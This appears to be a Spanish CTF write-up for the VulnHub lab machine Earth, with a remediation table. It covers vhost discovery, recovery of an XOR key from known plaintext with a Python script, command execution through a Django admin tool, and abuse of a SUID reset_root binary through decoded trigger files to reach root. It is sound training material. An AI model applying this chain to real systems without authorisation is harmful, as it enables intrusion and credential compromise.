[Inicio](../../../README.md) · [Red Team](../../README.md)

**Estado: completada hasta root** · [🌐 Abrir writeup visual](https://w4ltersec.github.io/cybersecurity-labs/red-team/vulnhub/earth/Earth-Writeup.html)

# Earth — The Planets — VulnHub

> **Sistema:** Linux / Fedora 34 · **Dificultad oficial:** Fácil · **Autor de la máquina:** SirFlash
> **Target del laboratorio:** `192.168.1.22` · **Objetivo:** flag de usuario + flag de root
> **Cadena:** `terra (panel) → apache → root`

[🔗 Abrir la máquina Earth en VulnHub](https://www.vulnhub.com/entry/the-planets_earth,755/)

## 0. Resumen ejecutivo

| Fase | Técnica | Resultado |
| --- | --- | --- |
| Reconocimiento | Certificado TLS y enumeración de vhosts | `earth.local` y `terratest.earth.local` |
| Fuga de información | `robots.txt`, notas y texto de prueba | Usuario `terra` y plaintext conocido |
| Acceso al panel | Criptoanálisis XOR y reutilización de credenciales | Acceso autenticado al panel Django |
| Ejecución de comandos | Admin Command Tool | `apache` y flag de usuario |
| Escalada | Ingeniería inversa del binario SUID `reset_root` | Restablecimiento de contraseña y acceso `root` |

**Flags**

- **User:** `user_flag_3353b67d6437f07ba7d34afd7d2fc27d`
- **Root:** `root_flag_b0da9554d29db2117b02aa8b66ec492e`

---

## 1. Reconocimiento

### Tres puertos y un certificado hablador

Barrido TCP completo. La superficie es mínima — SSH y un Apache con doble HTTP/HTTPS — pero el certificado del 443 regala los nombres de host virtuales, sin los cuales Apache solo contesta `400 Bad Request`.

**nmap -sVC**

```bash
$ nmap -sS -p- --min-rate 2500 192.168.1.22
22/tcp   open  ssh      OpenSSH 8.6 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.51 ((Fedora) mod_wsgi/4.7.1 Python/3.9)
443/tcp  open  ssl/http Apache httpd 2.4.51 ((Fedora) ... )

$ nmap -sVC -p443 192.168.1.22 | grep -i -A2 ssl-cert
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
```

**Loot**

Dos vhosts para resolver: `earth.local` (app) y `terratest.earth.local` (entorno de pruebas). Añádelos a `/etc/hosts` o usa `curl --resolve`.

## 2. Enumeración web

### El vhost de pruebas lo cuenta todo

El `robots.txt` de `terratest` desautoriza `/testingnotes.*` — una señal de neón apuntando al fichero. Dentro, las notas de desarrollo filtran el diseño criptográfico completo.

**terratest.earth.local/testingnotes.txt**

```text
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*Need to test different key lengths to protect against bruteforce.
```

Tres regalos en cuatro líneas: el algoritmo es **XOR**, existe un **plaintext conocido** (`testdata.txt`, un párrafo sobre la formación de la Tierra), y el usuario del panel es **terra**. La propia nota admite que la clave es corta y reutilizada — exactamente el escenario que rompe XOR.

## 3. Criptoanálisis

### Known-plaintext: XOR se desmorona

La portada de `earth.local` lista los "Previous Messages" en hex. El mensaje más largo es el cifrado de `testdata.txt`. Como `C = P ⊕ K`, entonces `K = C ⊕ P`: XOR-eando cifrado contra plaintext conocido cae la clave repetida.

**recover_key.py**

```python
import binascii
ct = binascii.unhexlify(open("msg3.hex").read().strip())
pt = b"According to radiometric dating estimation and other evidence, Earth formed..."
key = bytes(c ^ p for c, p in zip(ct, pt))
print(key[:40])
#  b'earthclimatechangebad4humansearthclimate'
```

**Clave recuperada**

La clave repetida es earthclimatechangebad4humans. Y como advertían las notas, está **reutilizada**: es también la contraseña del portal admin de `terra`.

## 4. Acceso & RCE

### Login Django, luego ejecución de comandos

El panel vive en `/admin/login` (Django, con protección CSRF: hay que capturar el `csrftoken` y enviar *Referer*). Autenticado como `terra`, aparece un "Admin Command Tool" que ejecuta comandos del sistema sin sandbox.

**authenticated command exec**

```bash
# login (CSRF) → cli_command=id
terra@admin$ id
uid=48(apache) gid=48(apache) groups=48(apache)

terra@admin$ cat /var/earth_web/user_flag.txt
[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
```

**Shell como apache**

Ejecución de comandos arbitrarios como `uid=48(apache)`. Suficiente para la user flag y para empezar a enumerar la escalada local.

## 5. Escalada de privilegios

### Desmontando el SUID reset_root

Entre los binarios SUID aparece `/usr/bin/reset_root`: resetea la contraseña de root a `Earth`… pero solo si existen tres "ficheros trigger". Ejecutado en seco, falla. Las rutas están ofuscadas dentro del binario, así que lo exfiltro y lo desensamblo.

**reset_root (sin triggers)**

```bash
apache$ /usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```

Sin `ltrace` en el objetivo, saco el binario por base64 y lo abro con `objdump`. `main` construye cada ruta en una función `magic_cipher` antes de cada `access()`. Reimplementada, es un XOR Vigenère de dos pasos:

**decode_triggers.py**

```python
def mc(inb, key, count, keylen):
    return bytes(inb[i] ^ key[i % (keylen-1)] for i in range(count))

# paso 1: deriva la sub-clave con "palebluedot"
midkey = mc(cipher0, b"palebluedot", 0x11, 0xc)   # -> b"thebluemarble1972"

# paso 2: descifra las 3 rutas con la sub-clave
t1 = mc(cipher1, midkey, 0x11, 0x12)   # /dev/shm/kHgTFI5G
t2 = mc(cipher2, midkey, 0x11, 0x12)   # /dev/shm/Zw7bV9U5
t3 = mc(cipher3, midkey, 0x0d, 0x12)   # /tmp/kcM0Wewe   <- 13 bytes!
```

**Trampa — off-by-one**

El `count` de la 3ª llamada es `0x0d = 13`, no 12. El tercer trigger es /tmp/kcM0Wewe (con la **e** final), no `/tmp/kcM0Wew`. Crear la ruta de 12 caracteres hace que `reset_root` siga fallando — exactamente lo que pasó en el primer intento.

**trigger → reset → root**

```bash
apache$ touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe
apache$ /usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth

apache$ echo Earth | su root -c 'id; cat /root/root_flag.txt'
uid=0(root) gid=0(root) groups=0(root)
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```

## 6. Post-explotación

### Usuarios, hashes y claves SSH

El objetivo pedía usuarios y sus claves SSH. Dato clave: **no existen claves SSH de usuario** en la máquina — ni `/root/.ssh` ni `/home/earth/.ssh` tienen `id_*` o `authorized_keys`. La autenticación es por contraseña, así que el botín son credenciales.

| Usuario | UID | Shell | Credencial |
| --- | --- | --- | --- |
| root | 0 | /bin/bash | **Earth** (reseteada · crackeada) |
| earth | 1000 | /bin/bash | $6$FIzdW32O… no en rockyou |

Únicas claves privadas presentes: las *host keys* del servidor (`/etc/ssh/ssh_host_*_key`) y la clave TLS `/etc/ssh/earth.local.key` — identidad del servidor, no de usuarios. El hash de `earth` resistió rockyou (SHA-512, contraseña robusta); con root ya conseguido, no aporta seguir.

## 7. Remediación

### Cómo se rompe la cadena

| Debilidad | Severidad | Corrección |
| --- | --- | --- |
| Vhost de pruebas con notas de diseño expuestas | Crítica | Retirar `terratest` y los `.txt` de producción |
| XOR con clave corta reutilizada como contraseña | Crítica | Cripto autenticada real; nunca reutilizar la clave como credencial |
| Panel admin con ejecución de comandos sin sandbox | Alta | Eliminar la herramienta o encerrarla en allow-list sin shell |
| SUID reset_root con lógica de trigger reversible | Alta | Quitar el bit SUID; no dejar backdoors de reseteo |
| SSH por contraseña | Media | Forzar autenticación por clave pública |


---

*Writeup basado en el HTML proporcionado por W4lterSec. Práctica realizada en un laboratorio autorizado; flags y credenciales corresponden a la máquina de prácticas.*
